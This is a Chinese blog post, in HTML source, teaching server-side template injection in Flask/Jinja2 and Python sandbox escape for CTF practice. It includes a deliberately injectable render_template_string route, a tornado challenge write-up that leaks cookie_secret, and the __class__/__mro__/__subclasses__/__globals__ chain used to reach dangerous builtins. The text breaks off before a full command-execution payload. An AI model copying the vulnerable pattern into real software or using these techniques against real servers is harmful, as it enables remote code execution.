@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="SSTI&#x2F;python沙箱逃逸漏洞成因ssti，即服务端模板注入，指攻击者能够使用本机模板语法将恶意有效负载注入模板中，然后在服务器端执行该模板。主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI&#x2F;python沙箱逃逸">
+<meta property="og:url" content="http://example.com/2021/03/17/SSTI/index.html">
+<meta property="og:site_name" content="無限可能">
+<meta property="og:description" content="SSTI&#x2F;python沙箱逃逸漏洞成因ssti，即服务端模板注入，指攻击者能够使用本机模板语法将恶意有效负载注入模板中，然后在服务器端执行该模板。主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jiulin23/image@2.5.0/SSTI/1.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jiulin23/image@2.5.0/SSTI/2.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jiulin23/image@2.5.0/SSTI/3.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jiulin23/image@2.5.0/SSTI/4.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jiulin23/image@2.5.0/SSTI/5.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/jiulin23/image@2.5.0/SSTI/6.png">
+<meta property="article:published_time" content="2021-03-17T09:51:57.000Z">
+<meta property="article:modified_time" content="2021-03-17T10:00:53.831Z">
+<meta property="article:author" content="jiulin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jiulin23/image@2.5.0/SSTI/1.png">
+
+<link rel="canonical" href="http://example.com/2021/03/17/SSTI/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SSTI/python沙箱逃逸 | 無限可能</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">無限可能</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">个人邮箱：985885413@qq.com</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/17/SSTI/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="jiulin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="無限可能">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SSTI/python沙箱逃逸
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-17 17:51:57 / 修改时间：18:00:53" itemprop="dateCreated datePublished" datetime="2021-03-17T17:51:57+08:00">2021-03-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="SSTI-python沙箱逃逸"><a href="#SSTI-python沙箱逃逸" class="headerlink" title="SSTI/python沙箱逃逸"></a>SSTI/python沙箱逃逸</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>ssti，即服务端模板注入，指攻击者能够使用本机模板语法将恶意有效负载注入模板中，然后在服务器端执行该模板。主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，究其原因是程序员对代码不规范不严谨，导致了用户输入被串联到模板中而不是作为数据传递，才造成了模板注入漏洞，造成模板可控。</p>
+<h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p>模板是一种提供给程序来解析的一种语法，换句话说，模板是把数据（变量）变成视觉表现（HTML代码）的实现手段，而这种手段不论在前端还是后端都有应用。</p>
+<p>通俗点说就是，拿到数据，放到模板里面，然后让渲染引擎将这些东西生成为html的文本，返回给浏览器。这样做的好处是可以大大提升效率。<a id="more"></a></p>
+<h2 id="服务端模板注入的形成"><a href="#服务端模板注入的形成" class="headerlink" title="服务端模板注入的形成"></a>服务端模板注入的形成</h2><p>通过模板，我们可以通过输入转换成特定的HTML文件，比如一些博客页面，登陆的时候可能会返回 hi,张三。这个张三可能就是把你的身份信息渲染成html返回到页面。</p>
+<p>这里模板引擎就可能会出现漏洞，也就是将不可靠的用户的恶意数据经过引擎解析之后，没有过滤直接进行了执行。下面会详细讲到。</p>
+<h2 id="flask基础知识"><a href="#flask基础知识" class="headerlink" title="flask基础知识"></a>flask基础知识</h2><h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>Flask是一个Python编写的Web 微框架，让我们可以使用Python语言快速实现一个网站或Web服务。其WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。</p>
+<p>Flask 为你提供工具，库和技术来允许你构建一个 web 应用程序。这个 web 应用程序可以是一些 web 页面、博客、wiki、基于 web 的日历应用或商业网站。</p>
+<p>flask代码简单示例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span>    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p><code>app = Flask(__name__)</code> ：Flask类必须指定一个参数，即主模块或包的名字。这里<code>__name__</code>为系统变量，指的是当前py文件的文件名。</p>
+<p><code>@app.route()</code>： 路由与视图函数。从client发送的url通过web服务器传给flask实例对象时，因为该实例需要知道对于每个url要对应执行哪部分的函数所以保存了一个url和函数之间的映射关系，<strong>处理url和函数之间关系的程序</strong>称为路由，在flask中用的是app.route路由装饰器，<strong>把装饰的函数注册为路由</strong>。简单理解就是<code>@app.route(url)</code>装饰器告诉Flask什么url触发什么函数，而通过装饰器将函数与url绑定在一起就称为路由。<br><code>app.run()</code>：样例为 <code>run_simple(host, port, self, **options)</code> 当不设置时，默认监听127.0.0.1:5000, 监听0.0.0.0的话则任意IP都可访问。该函数作用为开启flask集成的web服务，服务开启后会一直监听5000端口并处理请求知道程序停止。</p>
+<h4 id="渲染方法"><a href="#渲染方法" class="headerlink" title="渲染方法"></a>渲染方法</h4><p><strong>render_template()</strong></p>
+<p>渲染一个指定的文件，这个指定的文件其实就是模板。</p>
+<p><strong>render_template_string()</strong></p>
+<p>渲染一个字符串，经常会被利用。</p>
+<h4 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h4><p>flask是用jinja2作为渲染引擎的。</p>
+<h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><p>在jinja2中存在三种语法</p>
+<ol>
+<li> { { } } 装载一个变量，渲染模板的时候，会使用传进来的同名参数将这个变量代表的值替换掉</li>
+<li> { { % % } } 装载一个控制语句 if..</li>
+<li> { # # } 装载一个注释，模板渲染的时候会忽略这中间的值</li>
+</ol>
+<h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><p>变量可以通过“过滤器”进行修改，可以理解为是jinja2里面的内置函数和字符串处理函数。</p>
+<p>在变量后面使用管道（|）分割，多个过滤器可以链式调用，前一个过滤器的输出会作为后一个过滤器的输入。</p>
+<p>举例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#39;abc&#39; | captialize  &#125;&#125;</span><br><span class="line"># Abc</span><br><span class="line"> </span><br><span class="line">&#123;&#123; &#39;abc&#39; | upper  &#125;&#125;</span><br><span class="line"># ABC</span><br><span class="line"> </span><br><span class="line">&#123;&#123; &#39;hello world&#39; | title  &#125;&#125;</span><br><span class="line"># Hello World</span><br><span class="line"> </span><br><span class="line">&#123;&#123; &quot;hello world&quot; | replace(&#39;world&#39;,&#39;daxin&#39;) | upper &#125;&#125;</span><br><span class="line"># HELLO DAXIN</span><br><span class="line"> </span><br><span class="line">&#123;&#123; 18.18 | round | int &#125;&#125;</span><br><span class="line"># 18</span><br></pre></td></tr></table></figure>
+
+<p><strong>常见过滤器</strong></p>
+<ul>
+<li>safe: 渲染时值不转义</li>
+<li>capitialize: 把值的首字母转换成大写，其他子母转换为小写</li>
+<li>lower: 把值转换成小写形式</li>
+<li>upper: 把值转换成大写形式</li>
+<li>title: 把值中每个单词的首字母都转换成大写</li>
+<li>trim: 把值的首尾空格去掉</li>
+<li>striptags: 渲染之前把值中所有的HTML标签都删掉</li>
+<li>join: 拼接多个值为字符串</li>
+<li>replace: 替换字符串的值</li>
+<li>round: 默认对数字进行四舍五入，也可以用参数进行控制</li>
+<li>int: 把值转换成整型</li>
+</ul>
+<h2 id="漏洞举例"><a href="#漏洞举例" class="headerlink" title="漏洞举例"></a>漏洞举例</h2><p>一个安全的代码应该如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET&#x27;</span>] = <span class="string">&quot;root:password&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/index&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,title=<span class="string">&#x27;SSTI_TEST&#x27;</span>,name=request.args.get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--/www/templates/index.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125; - cl4y<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;name&#125;&#125; !<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们在index.html里面构造了两个渲染模板，用户通过传递name参数可以控制回显的内容。即使用户输入渲染模板，更改语法结构，也不会造成SSTI注入。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.5.0/SSTI/1.png"></p>
+<p>原因是：服务端先将index.html渲染，然后读取用户输入的参数，模板其实已经固定，用户的输入不会更改模板的语法结构。</p>
+<p>但如果CTF中或程序员为省事将代码这么写：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&#x27;/test/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    code = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>%(code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.5.0/SSTI/2.png"></p>
+<p>这时，我们将数学运算设置为参数的值输入的内容，由于Flask 用Jinja2 作为模板渲染引擎，<code>&#123;&#123;&#125;&#125;`在Jinja2中作为变量包裹标识符，渲染的时候把`&#123;&#123;&#125;&#125;</code>包裹的内容当做变量解析替换，我们就可以看到这个数学运算被计算了，服务器渲染然后输出，这就形成了SSTI模板注入漏洞，可以直接xss等攻击。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.5.0/SSTI/3.png"></p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>遇上一个SSTI的题，该如何下手？大体上有以下两种思路：</p>
+<ul>
+<li><p>查配置文件</p>
+<p>python框架，如flask，会在框架中内置全局变量、函数等，我们可以调用它来查阅配置文件。比如<code>&#123;&#123;config&#125;&#125;</code>。</p>
+<p>这里用BUUCTF中的easy_tornado举例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br><span class="line"></span><br><span class="line">&#x2F;flag.txt</span><br><span class="line">flag in &#x2F;fllllllllllllag</span><br></pre></td></tr></table></figure>
+
+<p>从题目hint提示中我们得知，需要知道当前的cookie_secret，尝试后弹出了error界面。结合前面的render提示，我们推测这里有模板注入。</p>
+<p>因此我们利用tornado引擎的<code>handler.settings</code>属性就可以得到session：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.5.0/SSTI/4.png"></p>
+<p>之后经过计算得到flag，注意这里要对字符串进行类型转换，py3下字符串为unicode，hash传递需要utf-8。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span></span><br><span class="line">  md5=hashlib.md5()<span class="comment">#创建了一个md5算法的对象(md5不能反解)，即造出hash工厂</span></span><br><span class="line">  md5.update((s).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">  <span class="keyword">return</span> md5.hexdigest()<span class="comment">#产出hash值,拿到加密字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  filename = <span class="string">&#x27;/fllllllllllllag&#x27;</span></span><br><span class="line">  cookie_secret = <span class="string">&#x27;0364c59d-ec90-4fb3-a189-08592e0d9661&#x27;</span></span><br><span class="line">  print(md5(cookie_secret+md5(filename)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.5.0/SSTI/5.png"></p>
+</li>
+<li><p>命令执行（其实就是沙箱逃逸类题目的利用方式，下面会详细讲）</p>
+</li>
+</ul>
+<h1 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h1><p>沙箱逃逸,就是在给我们的一个代码执行环境下，脱离种种过滤和限制，最终成功拿到shell权限的过程。</p>
+<h2 id="python的沙箱逃逸的过程"><a href="#python的沙箱逃逸的过程" class="headerlink" title="python的沙箱逃逸的过程"></a>python的沙箱逃逸的过程</h2><p>首先要知道，python中一切均为对象，均继承于object对象，python的object类中集成了很多的基础函数，假如我们需要在payload中使用某个函数就需要用object去操作。</p>
+<p>利用各类之间的继承关系，完成以下寻找：</p>
+<p>变量对象—&gt;找到所属类型—&gt;回溯基类—&gt;寻找可利用子类—&gt;获取全局变量</p>
+<h2 id="一些内置方法-属性"><a href="#一些内置方法-属性" class="headerlink" title="一些内置方法/属性"></a>一些内置方法/属性</h2><ul>
+<li>__class__：用来查看变量所属的类，根据前面的变量形式可用得到其所属的类</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>__bases__：用来查看类的基类，也可是使用数组索引来查看特定位置的值</li>
+<li>__mro__：递归地显示父类一直到 object。</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line">--------------------------------------------------</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__mro__</span><br><span class="line">(&lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__</span><br><span class="line">(&lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[<span class="number">1</span>]  <span class="comment"># 使用索引就能获取基类了</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>subclasses</strong>()：查看当前类的子类，以元祖形式返回。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>__init__</strong></li>
+</ul>
+<p>所有的可被当作模块导入的都包含 <code>__init__</code>方法，通过此方法来调用 <code>__globals__</code>方法</p>
+<ul>
+<li><strong>__globals__</strong></li>
+</ul>
+<p>所有函数都会有一个 <code>__globals__</code> 属性， 用于获取当前空间下可使用的模块、方法及其所有变量，结果是一个字典。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>var = <span class="number">2333</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">test</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(test.__init__.__globals__)</span><br><span class="line">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;os&#x27;: &lt;module &#x27;os&#x27; from &#x27;C:\\Python3.7\\lib\\os.py&#x27;&gt;, &#x27;var&#x27;: 2333, &#x27;fun&#x27;: &lt;function fun at 0x00000238058C11F8&gt;, &#x27;test&#x27;: &lt;class &#x27;__main__.test&#x27;&gt;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>__builtins__</strong></p>
+<p>在 Python 中，有很多函数不需要任何 import 就可以直接使    用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。</p>
